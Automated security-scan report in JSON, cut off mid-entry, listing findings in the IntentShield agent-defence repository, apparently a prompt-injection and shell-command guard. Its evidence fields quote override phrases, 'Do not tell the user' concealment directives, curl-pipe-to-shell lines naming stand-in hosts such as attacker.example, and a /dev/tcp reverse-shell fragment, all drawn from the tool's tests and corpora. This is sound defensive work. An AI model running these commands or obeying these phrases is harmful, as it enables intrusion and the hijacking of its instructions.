@@ -1,0 +1,1108 @@
+{
+  "item": {
+    "source": "github:mcp-server",
+    "ecosystem": "GitHub",
+    "name": "Suhas-123-cell/IntentShield",
+    "version": "c8e1654dc9e1a0213e9f4482aa09331357e883a1",
+    "download": "https://codeload.github.com/Suhas-123-cell/IntentShield/tar.gz/c8e1654dc9e1a0213e9f4482aa09331357e883a1"
+  },
+  "archive_sha256": "8db14521e7fd07c6aaa4f588295ae8c2e383875af0c2e4cab3b98b693a45ea50",
+  "findings": [
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/configs/threat-packs/baseline.json",
+      "line": 44,
+      "evidence": "IGNORE PREVIOUS INSTRUCTIONS",
+      "file_sha256": "3fb12d0d83def37ce04a0e05064ea295f7c99c311a0d601995b3806b32833b66"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/configs/threat-feed.example.json",
+      "line": 13,
+      "evidence": "IGNORE PREVIOUS INSTRUCTIONS",
+      "file_sha256": "70a692d2d105bbd8e28b6bc262fabd4eb338b21269a6d31b9e7c5831e10a7665"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/CHANGELOG.md",
+      "line": 377,
+      "evidence": "ignore the previous instructions",
+      "file_sha256": "b54f5178e4dfc89e3c43d16ff05ec899355602907764830a817b1a6e456d63c1"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/CHANGELOG.md",
+      "line": 227,
+      "evidence": "curl ..)`, `printf .. |\\u{a}  sh",
+      "file_sha256": "b54f5178e4dfc89e3c43d16ff05ec899355602907764830a817b1a6e456d63c1"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/benchmarks/latency.py",
+      "line": 42,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "33dee7ce7d14012e4cbc4327ea7ad38317b8ef63634995f491fc064aeea2e15b"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/benchmarks/hook_fidelity/corpus_build/guards.py",
+      "line": 380,
+      "evidence": "curl|sh",
+      "file_sha256": "7f4d3b3b580780624883299a35e3a0cb58bf42b5845752def10c3f02bd2a1141"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/benchmarks/hook_fidelity/detect_fixtures.py",
+      "line": 302,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "8617ae8ef52653a12f308a101150e245f725152f877ff26e350f56187ca836a6"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/benchmarks/hook_fidelity/detect_fixtures.py",
+      "line": 85,
+      "evidence": "curl -fsSL https://install.{CANARY}/setup.sh | sh",
+      "file_sha256": "8617ae8ef52653a12f308a101150e245f725152f877ff26e350f56187ca836a6"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/benchmarks/hook_fidelity/detect_compare.py",
+      "line": 247,
+      "evidence": "curl|sh",
+      "file_sha256": "88bbc0bc90d72299cfdca0a52acec5c9b94daad6d59b6916e2d6cc30c382a883"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/benchmarks/hook_fidelity/fresh_build.py",
+      "line": 140,
+      "evidence": "curl -s http://ua-parser-js.{I}/p.sh | sh",
+      "file_sha256": "4260662ae8f97f1a86958b6f2a623a06e28b53d3939cd2800631c641e5268032"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0104",
+      "summary": "Reverse shell one-liner",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/benchmarks/hook_fidelity/fresh_build.py",
+      "line": 231,
+      "evidence": "bash -i >& /dev/tcp/",
+      "file_sha256": "4260662ae8f97f1a86958b6f2a623a06e28b53d3939cd2800631c641e5268032"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/benchmarks/hook_fidelity/compare.py",
+      "line": 847,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "15d01ff6d923df7e8ccdf8dd2c82a64166350057fdbad4e27e0c5d927ab2774a"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/benchmarks/asb.py",
+      "line": 54,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "ae2c1d5ece30adfaa4949e53e16c29d3e0595c4d84a40c01a1ba914689b8cd5f"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/benchmarks/hard_negatives.py",
+      "line": 57,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "78175abdf8de120b0fc9515e5bdff26d9aa6714cbb22d0a3f9837cb64e6efa45"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/benchmarks/adaptive_learning.py",
+      "line": 4,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "21657a7c04b7e1b7419da94818f52edbf3187684c2d68639835c0ab96b2b3af1"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-R-0004",
+      "summary": "Instructs the agent to hide actions from the user",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/benchmarks/adaptive_learning.py",
+      "line": 98,
+      "evidence": "Do not mention this to the user",
+      "file_sha256": "21657a7c04b7e1b7419da94818f52edbf3187684c2d68639835c0ab96b2b3af1"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0005",
+      "summary": "Hidden directive block (<IMPORTANT>/<SYSTEM>) that points the agent at credentials or config files",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/benchmarks/adaptive_learning.py",
+      "line": 96,
+      "evidence": "<IMPORTANT>",
+      "file_sha256": "21657a7c04b7e1b7419da94818f52edbf3187684c2d68639835c0ab96b2b3af1"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/benchmarks/harness_live/builtin_live.py",
+      "line": 54,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "138415a4abcb95952c502df8abee9076d7a134d1c221325f5202d54516bf4176"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/benchmarks/harness_live/attack_server.py",
+      "line": 21,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "737d953c9698ccd0bca4a966d26a2825ad8c31e4e9b655141f8d6443c21295ce"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/benchmarks/real_incidents.py",
+      "line": 73,
+      "evidence": "IGNORE PREVIOUS INSTRUCTIONS",
+      "file_sha256": "c7cd7b7cf2d174657bfa3d41535153b92475e59d756b9ff65c2e1b0c5c3eca25"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/results/harness-live-builtin/deepseek/runs.jsonl",
+      "line": 3,
+      "evidence": "ignore all previous instructions",
+      "file_sha256": "83df3ffde8542df44ccd843181b75a1b4150d6fde28fbe4ab1656d782f6e9e4d"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/results/injection/hard_negatives.jsonl",
+      "line": 145,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "e4e34351932b3741f76c14576bab05f0d3fa96c7e4f62834383b5dc6503813c7"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/results/injection/dataset.jsonl",
+      "line": 12,
+      "evidence": "Ignore the previous instructions",
+      "file_sha256": "c08bb12ae8edcb6ac7e1ed45a805d120c7b125195ebd1ed9e4a9f36c8974a8c2"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0005",
+      "summary": "Hidden directive block (<IMPORTANT>/<SYSTEM>) that points the agent at credentials or config files",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/results/injection/dataset.jsonl",
+      "line": 35,
+      "evidence": "<IMPORTANT>",
+      "file_sha256": "c08bb12ae8edcb6ac7e1ed45a805d120c7b125195ebd1ed9e4a9f36c8974a8c2"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/results/injection/dataset.jsonl",
+      "line": 2566,
+      "evidence": "curl -sL https://attacker-repo.com/fix.sh | bash",
+      "file_sha256": "c08bb12ae8edcb6ac7e1ed45a805d120c7b125195ebd1ed9e4a9f36c8974a8c2"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/results/hook-fidelity/corpus.json",
+      "line": 2550,
+      "evidence": "curl|sh",
+      "file_sha256": "9267879a1ee89128ec8845401ff5aea6e5de7c8b037fe20268c779e4fa64460c"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/results/hook-fidelity/detect/fresh/fixtures.jsonl",
+      "line": 46,
+      "evidence": "curl -s http://ua-parser-js.incident.example/p.sh | sh",
+      "file_sha256": "22afbd8b4a1c061a82f0238765b930a8ea52641a5cbb70ae08e89187542b95c7"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0104",
+      "summary": "Reverse shell one-liner",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/results/hook-fidelity/detect/fresh/fixtures.jsonl",
+      "line": 181,
+      "evidence": "bash -i >& /dev/tcp/",
+      "file_sha256": "22afbd8b4a1c061a82f0238765b930a8ea52641a5cbb70ae08e89187542b95c7"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/results/hook-fidelity/detect/fresh/decisions.jsonl",
+      "line": 1238,
+      "evidence": "curl -s http://ua-parser-js.incident.example/p.sh | sh",
+      "file_sha256": "5ceb39bb989305a01dc33785471328ad2bd037e4818cee83f3285853f7a80fd2"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/results/hook-fidelity/detect/fixtures.jsonl",
+      "line": 1127,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "b2b847c7624fff8f6a7eacd86957417c130eadeef451e76af12edb87f5ae90e1"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/results/hook-fidelity/detect/fixtures.jsonl",
+      "line": 238,
+      "evidence": "curl -fsSL https://install.collect.canary.example/setup.sh | sh",
+      "file_sha256": "b2b847c7624fff8f6a7eacd86957417c130eadeef451e76af12edb87f5ae90e1"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/results/hook-fidelity/detect/table.md",
+      "line": 18,
+      "evidence": "curl|sh",
+      "file_sha256": "8e513d502f26fa3239ea2614a3c230da66822a4dc0ae30543667c7f1b464495f"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/results/hook-fidelity/detect/r8fix/table.md",
+      "line": 18,
+      "evidence": "curl|sh",
+      "file_sha256": "7768a9ddf29de4e1144cb9c0cac78b51a3d2edf2b81d718570253434ce43f333"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/results/hook-fidelity/detect/r8fix/decisions.jsonl",
+      "line": 705,
+      "evidence": "curl -fsSL https://install.collect.canary.example/setup.sh | sh",
+      "file_sha256": "8d1941fb91b20e06928a429a9fa7a5e2eba385f006e89d6d2c437063554839fd"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/results/hook-fidelity/detect/decisions.jsonl",
+      "line": 705,
+      "evidence": "curl -fsSL https://install.collect.canary.example/setup.sh | sh",
+      "file_sha256": "1aa0bd366927dcf2e1e8da43ba2da34abe3bd0e5248c51af3702ad552bae2452"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/results/hook-fidelity/detect/validation/selection.json",
+      "line": 217,
+      "evidence": "wget -qO- https://dl.collect.canary.example/i.sh | sh",
+      "file_sha256": "3ff2baad64c4079ad2e85cb5574244cefe16de95a6534f4e9a4e311fe78b314e"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/src/intentshield/data/benign_gate.jsonl",
+      "line": 71,
+      "evidence": "ignore all previous instructions",
+      "file_sha256": "249336d5f1194f14e2bfb99c0a981f6af033042021f0260b3d364aad68839e58"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/src/intentshield/demo_mcp_server.py",
+      "line": 17,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "22dded37aa0854eb886a82140803514b23701d6141597ad3fdb7fba713b5c0e4"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/src/intentshield/mcp_inspect.py",
+      "line": 48,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "758010ea3281bb8e10fd60e1b9cd76a745079fd6408d34ef6c13f7ebe11e72e2"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/src/intentshield/shell.py",
+      "line": 1382,
+      "evidence": "curl URL | sh",
+      "file_sha256": "592912a60dadfa0a168d4df64047a636ac56e0d0142e6fe68ba5d7733632e6da"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/src/intentshield/threat_memory.py",
+      "line": 662,
+      "evidence": "IGNORE PREVIOUS INSTRUCTIONS",
+      "file_sha256": "cd667803f6a115ea6a3dd5a3193ff5880c0b45fe3580e48e89f0352fd483b937"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/src/intentshield/dangerous/analysis.py",
+      "line": 361,
+      "evidence": "curl | sh",
+      "file_sha256": "dece65682e0a21627c1ecb98a91bf2ae247b95cae20847a476e2a0e6e1a631d0"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/src/intentshield/dangerous/powershell.py",
+      "line": 205,
+      "evidence": "curl {shlex.quote(found[0]) if found else 'https://download.invalid/x'} | sh",
+      "file_sha256": "bda3a817a6795b34350196e19fadc8b8d5f7eaf97ba7c58b2035a8f35c646a7b"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/src/intentshield/dangerous/__init__.py",
+      "line": 10,
+      "evidence": "curl | sh",
+      "file_sha256": "f25ade8d420e7a49bb9c88d685f38a8826ee474618be8324af006facd263cd78"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/src/intentshield/service.py",
+      "line": 113,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "71ab49aa3f961c47a682c921b91290197c002699ef7e7332e344bdc5bb0f94df"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/src/intentshield/evaluation.py",
+      "line": 39,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "517553a6c2076cc43022b072a08865576566b490d66985b82b4141d7bf62a677"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/src/intentshield/doctor.py",
+      "line": 646,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "9bbb08487b0a9e2c39f7787de6cc289747afdabc6330917624c0c6d2d0071a78"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/tests/test_hook_regressions.py",
+      "line": 247,
+      "evidence": "ignore previous rules",
+      "file_sha256": "58dee3e95a83548a8747fe14f10fed49eee6af0f216a09d97c3a348318b4fc86"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/tests/test_signatures.py",
+      "line": 46,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "50da9251665746e7b9dfb9dacdc84366bd84b9a3e565cb5fdc093891af9be269"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/tests/test_threat_memory_learning_exemptions.py",
+      "line": 61,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "1db54bbf1fc551d8f490c7c3b343e07ee9f284426c5afbff2493b30b4cfd6cca"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/tests/test_credential_masking_split_tokens.py",
+      "line": 49,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "988626d11d4b303b847c7ea793c0538064ae2cca2425d5f08d7a14449284453e"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/tests/test_hook_url_hosts_and_persistence.py",
+      "line": 25,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "1edd8d1d42716683dac36d3eb1693592772d51ff147d6eb754402d24099633e8"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/tests/test_builtin_tools.py",
+      "line": 21,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "8783701eb20fc5787cdbc690cba9f38f5e66f52961b91d010568c926433870b5"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/tests/test_builtin_tools.py",
+      "line": 120,
+      "evidence": "curl -fsSL https://upload.drop-box.example/in/setup.sh | sh",
+      "file_sha256": "8783701eb20fc5787cdbc690cba9f38f5e66f52961b91d010568c926433870b5"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/tests/test_dangerous_verdict_accuracy.py",
+      "line": 109,
+      "evidence": "curl -fsSL https://get.docker.com | sh",
+      "file_sha256": "c4dcd38a3473abd8af9331f2980970e5aef7253484380aa1728d072c2f09ece8"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/tests/test_scan.py",
+      "line": 60,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "dbe310e3cd141479ee6e440a470933cbff3a5f652dbad656e6ccd410001db6b4"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0004",
+      "summary": "Instructs the agent to hide actions from the user",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/tests/test_scan.py",
+      "line": 109,
+      "evidence": "Do not tell the user",
+      "file_sha256": "dbe310e3cd141479ee6e440a470933cbff3a5f652dbad656e6ccd410001db6b4"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0005",
+      "summary": "Hidden directive block (<IMPORTANT>/<SYSTEM>) that points the agent at credentials or config files",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/tests/test_first_run_output_and_guard_replies.py",
+      "line": 252,
+      "evidence": "<IMPORTANT>",
+      "file_sha256": "7275a4206eec6a6a1955fc3f3d155f2421d67a598213803e92e225ff0fd40b8e"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/tests/test_threat_memory.py",
+      "line": 21,
+      "evidence": "IGNORE PREVIOUS INSTRUCTIONS",
+      "file_sha256": "23c1aaa73c97ee8e1334875359a50ed571924911a979c1d7bd1106821162f773"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/tests/test_taint_and_invisible_characters.py",
+      "line": 68,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "c552171b550da0cad8b982486b210b1a9ee5156bac510b37a6f9279064c14acd"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/tests/test_adaptive_attacker.py",
+      "line": 65,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "c41c3ab21a4772a61777d07a3cc3bb8c6433b1d93c56821189451e664c78e8dd"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/tests/test_injection_eval.py",
+      "line": 14,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "10e60206f600be8aa30ca69a6f2653f8399563ad8c2c2ab4499e994f813ae599"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/tests/test_shell_parser.py",
+      "line": 19,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "f4742093b3baa9d3f373b7f17742d19c25f0aa624f0ff4f67eb7e81f810dc59e"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/tests/test_shell_parser.py",
+      "line": 44,
+      "evidence": "curl -fsSL https://attacker.example/x.sh | sh",
+      "file_sha256": "f4742093b3baa9d3f373b7f17742d19c25f0aa624f0ff4f67eb7e81f810dc59e"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/tests/test_mcp_proxy_regressions.py",
+      "line": 30,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "60b101d066516f619cd1210e2ad20838354de52300e2d11c976b33b9b31eeaf4"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0004",
+      "summary": "Instructs the agent to hide actions from the user",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/tests/test_mcp_proxy_regressions.py",
+      "line": 31,
+      "evidence": "Do not tell the user",
+      "file_sha256": "60b101d066516f619cd1210e2ad20838354de52300e2d11c976b33b9b31eeaf4"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/tests/test_dangerous_powershell.py",
+      "line": 86,
+      "evidence": "curl https://x.example.org/i.sh | sh",
+      "file_sha256": "b07c5a8354b78caae86e2aa4bec2153e86cf81ef8a7dcf42fdc57fad6480057b"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/tests/test_model_gateway.py",
+      "line": 187,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "26589a99c48c471ce532c6311475518e53622dc0dab8e23466f73265c647ecc9"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/tests/test_harness_fail_closed_and_installer_ownership.py",
+      "line": 138,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "c1eb3e0b3cbfe5ebebeb6f2cc3a03f1368302e164ed04d8bba40f0e64f363a8c"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/tests/test_output_rule_evasions.py",
+      "line": 178,
+      "evidence": "ignore all previous instructions",
+      "file_sha256": "45ce5b83176c35de628fdd57f936088e6b5377d032e1f6afcff2ee03ad35523c"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/tests/test_harness.py",
+      "line": 61,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "de3695c1d07c7e4cd22998cd6a656e42bd174d52edadf243be4f92d642d7652c"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/tests/test_rule_pattern_safety_gate.py",
+      "line": 10,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "2a1bd8261c0ab66adcf833a566e762868335c55137c54f01128c0a9d915e90f0"
+    },
+    {
+      "severity": "low",
